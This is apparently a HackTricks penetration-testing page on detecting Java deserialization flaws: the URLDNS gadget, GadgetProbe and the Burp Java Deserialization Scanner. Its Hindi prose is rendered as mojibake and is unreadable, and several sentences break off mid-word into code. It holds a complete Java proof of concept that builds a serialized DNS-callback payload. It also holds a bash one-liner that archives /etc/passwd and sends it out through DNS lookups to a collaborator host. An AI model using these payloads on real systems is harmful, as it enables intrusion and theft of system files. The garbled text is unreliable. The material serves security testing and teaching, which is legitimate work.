# рдЬрд╛рд╡рд╛ DNS рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди, рдЧреИрдЬреЗрдЯрдкреНрд░реЛрдм рдФрд░ рдЬрд╛рд╡рд╛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реНрдХреИрдирд░

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## рдбреАрдПрдирдПрд╕ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкрд░ рдбреАрдПрдирдПрд╕ рдЕрдиреБрд░реЛрдз

рдХрдХреНрд╖рд╛ `java.net.URL` `Serializable` рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддреА рд╣реИ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЗрд╕ рдХрдХреНрд╖рд╛ рдХреЛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```java
public final class URL implements java.io.Serializable {
```
рдпрд╣ рдХрдХреНрд╖рд╛ рдореЗрдВ рдПрдХ **рдЕрдЬреАрдм рд╡реНрдпрд╡рд╣рд╛рд░** рд╣реИред рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ: "**рджреЛ рд╣реЛрд╕реНрдЯ рд╕рдорд╛рди рдорд╛рдиреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдЕрдЧрд░ рджреЛрдиреЛрдВ рд╣реЛрд╕реНрдЯ рдирд╛рдо рдХреЛ рдПрдХ рд╣реА рдЖрдИрдкреА рдкрддреЗ рдореЗрдВ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**"ред\
рдлрд┐рд░, рд╣рд░ рдмрд╛рд░ рдЬрдм рдПрдХ URL рдСрдмреНрдЬ
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
рдпрд╣ **рдЪрд▓** рд░рд╣рд╛ рд╣реИ **рдХрд░рдиреЗ** рдХреЗ рд╕рд╛рде `putVal` рд╣рд░ рдорд╛рди рдХреЗ рдЕрдВрджрд░ `HashMap`ред рд▓реЗрдХрд┐рди, рдЕрдзрд┐рдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ `hash` рдХреЛ рд╣рд░ рдорд╛рди рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд░рдирд╛ред рдпрд╣ `hash` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдХреЛрдб рд╣реИ:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, **рдЬрдм рдПрдХ `HashMap` рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **`hash`** рдлрд╝рдВрдХреНрд╢рди **рд╣рд░ рдСрдмреНрдЬ
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдм рдПрдХ `URLObject` `.hashCode()` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ `hashCode(this)` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдХрд╛рд░реНрдп рдХреЗ рдХреЛрдб рдХреЛ рдЖрдк рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдиреАрдЪреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ `getHostAddress` рдбреЛрдореЗрди рдкрд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЬрд╛рддреА рд╣реИ, **рдПрдХ DNS рдХреНрд╡реЗрд░реА рд▓реЙрдиреНрдЪ** рдХрд░рддреЗ рд╣реБрдПред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдХреНрд▓рд╛рд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **DNS рдХреНрд╡реЗрд░реА рд▓реЙрдиреНрдЪ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдпрд╣ **рдкреНрд░рджрд░реНрд╢рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ **рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рд╕рдВрднрд╡ рд╣реИ, рдпрд╛ рдлрд┐рд░ рд╕реВрдЪрдирд╛ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП (рдЖрдк рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд╕рдмрдбреЛрдореЗрди рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ)ред

### URLDNS рдкреЗрд▓реЛрдб рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдЖрдк [URDNS рдкреЗрд▓реЛрдб рдХреЛрдб ysoserial рд╕реЗ рдпрд╣рд╛рдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ рдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордЭрдиреЗ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдВрдиреЗ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ PoC рдмрдирд╛рдпрд╛ рд╣реИ (ysoserial рдХреЗ рдЖрдзрд╛рд░ рдкрд░)ред
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдореЗрдВ рдереА рдХрд┐ commons collections payload рдХреЛ рдмрджрд▓рдХрд░ рдПрдХ DNS рдХреНрд╡реЗрд░реА рдХреЛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╡рд┐рдзрд┐ рд╕реЗ рдХрдо рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдерд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдкреЛрд╕реНрдЯ рд╣реИ: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

рдЖрдк [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) рдХреЛ рдмрд░реНрдк рд╕реБрдЗрдЯ рдРрдк рд╕реНрдЯреЛрд░ (рдПрдХреНрд╕рдЯреЗрдВрдбрд░) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**GadgetProbe** рдпрд╣ рдЬрд╛рдирдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдХреБрдЫ **рдЬрд╛рд╡рд╛ рдХреНрд▓рд╛рд╕реЗрд╕** рд╕рд░реНрд╡рд░ рдХреЗ рдЬрд╛рд╡рд╛ рдХреНрд▓рд╛рд╕ рдкрд░ рдореМрдЬреВрдж рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдпрд╣ рдЬрд╛рди рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдХрд┐рд╕реА рдЬреНрдЮрд╛рдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд▓рд┐рдП **рд╡рдВрд░реНрдирд░рдмрд▓** рд╣реИред

### рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ

**GadgetProbe** рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдХреЗ **DNS рдкреЗрд▓реЛрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди **DNS рдХреНрд╡реЗрд░реА рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ** рдпрд╣ **рдПрдХ рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рдХреНрд▓рд╛рд╕ рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛**ред рдпрджрд┐ **рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рдХреНрд▓рд╛рд╕ рдореМрдЬреВрдж рд╣реИ**, рддреЛ **DNS рдХреНрд╡реЗрд░реА** рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдФрд░ GadgetProbe рдпрд╣ рдиреЛрдЯ рдХрд░реЗрдЧрд╛ рдХрд┐ рдпрд╣ рдХреНрд▓рд╛рд╕ рдореМрдЬреВрдж рд╣реИред рдпрджрд┐ **DNS** рдЕрдиреБрд░реЛрдз рдХрднреА рдирд╣реАрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рдХреНрд▓рд╛рд╕ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдирд╣реАрдВ рд╣реБрдЖ** рдерд╛, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╛ рддреЛ рдпрд╣ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдпрд╛ рдпрд╣ **рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдирд╣реАрдВ рд╣реИ/рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрдмрд▓** рд╣реИред

рдЧрд┐рдердм рдХреЗ рдЕрдВрджрд░, [**GadgetProbe рдХреЗ рдкрд╛рд╕ рдХреБрдЫ рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ** рд╣реИрдВ](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) рдЬрд┐рдиреНрд╣реЗрдВ рдЬрд╛рд╡рд╛ рдХреНрд▓рд╛рд╕реЗрд╕ рдХреЗ рд▓рд┐рдП рдЯреЗрд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИред

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реНрдХреИрдирд░

рдпрд╣ рд╕реНрдХреИрдирд░ рдмрд░реНрдк рдПрдк рд╕реНрдЯреЛрд░ (рдПрдХреНрд╕рдЯреЗрдВрдбрд░) рд╕реЗ **рдбрд╛рдЙрдирд▓реЛрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рдкреИрд╕рд┐рд╡

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ рд╕рднреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯреНрд╕ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдХреЛ **рдкреИрд╕рд┐рд╡ рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ **рдЬрд╛рд╡рд╛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝рдб рдореИрдЬрд┐рдХ рдмрд╛рдЗрдЯреНрд╕** рдЦреЛрдЬрддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдХреЛрдИ рднреА рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ рд╡рдВрд░реНрдирд░рдмрд┐рд▓рд┐рдЯреА рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░рд╕реНрддреБрдд рдХрд░реЗрдЧрд╛:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (290).png>)

### рд╕рдХреНрд░рд┐рдп

**рдореИрдиреНрдпреБрдЕрд▓ рдЯреЗрд╕реНрдЯрд┐рдВрдЧ**

рдЖрдк рдПрдХ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд░рд╛рдЗрдЯ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ `Send request to DS - Manual Testing` рдХрд░реЗрдВред\
рдлрд┐рд░, _рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реНрдХреИрдирд░ рдЯреИрдм_ --> _рдореИрдиреНрдпреБрдЕрд▓ рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЯреИрдм_ рдХреЗ рдЕрдВрджрд░ рдЖрдк **рдЗрдиреНрд╕рд░реНрд╢рди рдкреЙрдЗрдВрдЯ** рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ **рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рд▓реЙрдиреНрдЪ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЗрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЙрдЪрд┐рдд рд╣рдорд▓рд╛ рдЪреБрдиреЗрдВ)ред

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

рдпрджреНрдпрдкрд┐ рдЗрд╕реЗ "рдореИрдиреНрдпреБрдЕрд▓ рдЯреЗрд╕реНрдЯрд┐рдВрдЧ" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рдХрд╛рдлреА **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рд╣реИред рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рдХрд┐рд╕реА **ysoserial рдкреЗрд▓реЛрдб** рдХреЗ рд▓рд┐рдП **рд╡рдВрд░реНрдирд░рдмрд▓** рд╣реИ рдпрд╛ рдирд╣реАрдВ, рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдореМрдЬреВрдж рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдФрд░ рд╡рдВрд░реНрдирд░рдмрд▓ рд╡рд╛рд▓реЗ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛ред **рд╡рдВрд░реНрдирд░рдмрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЖрдк **Javas Sleeps**, **CPU** рдЙрдкрднреЛрдХреНрддрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **sleeps**, рдпрд╛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрд▓реНрд▓рд┐рдЦрд┐рдд **DNS** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ**

рдПрдХ рд╡рдВрд░реНрдирд░рдмрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЖрдк рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ _рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ рдЯреИрдм_ рдореЗрдВ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕ рдЯреИрдм рдореЗрдВ рдЖрдкрдХреЛ рдлрд┐рд░ рд╕реЗ **рдЗрдиреНрдЬреЗрдХреНрд╢рди рдкреЙрдЗрдВрдЯ** рдХрд╛ рдЪрдпрди рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдФрд░ **рд╡рдВрд░реНрдирд░рдмрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдп** рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЖрдк рдкреЗрд▓реЛрдб рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдФрд░ **рдХрдорд╛рдВрдб**ред рдлрд┐рд░, рдЙрдЪрд┐рдд **рд╣рдорд▓рд╛** рдмрдЯрди рджрдмрд╛рдПрдВред

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/4 (1).png>)

### рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди DNS Exfil рдЬрд╛рдирдХрд╛рд░реА

рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
